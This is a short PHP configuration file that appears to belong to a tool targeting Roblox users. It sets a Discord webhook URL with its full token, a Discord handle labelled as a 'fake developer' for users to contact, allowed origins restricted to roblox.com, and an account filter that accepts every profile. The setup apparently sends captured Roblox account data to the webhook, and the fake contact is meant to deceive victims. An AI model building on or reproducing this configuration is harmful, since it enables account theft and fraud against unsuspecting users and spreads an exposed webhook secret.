<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/886364697492873226/as9R_qBP2iKuAe3HbpoiKv4JPobrsrk7EcwFijcJQ8UMo6UN9TdEUz_sXwk74FM09B2T";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
